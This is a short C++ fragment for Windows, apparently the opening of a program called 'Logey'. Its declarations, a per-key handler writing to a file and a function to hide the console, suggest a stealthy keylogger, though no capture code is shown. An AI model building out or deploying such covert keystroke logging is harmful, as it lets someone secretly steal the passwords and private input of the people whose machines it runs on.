#include <iostream>
#include <Windows.h>

using namespace std;

/*
*	Global debug variable
*	If true, the console will be shown and show live output.
*/
bool debug = false;
const double LOGEY_VERSION_NUMBER = 1.01;

void keys(int key, char *filename);
void hideConsole();
void createNewInstanceHeader(char *filename);
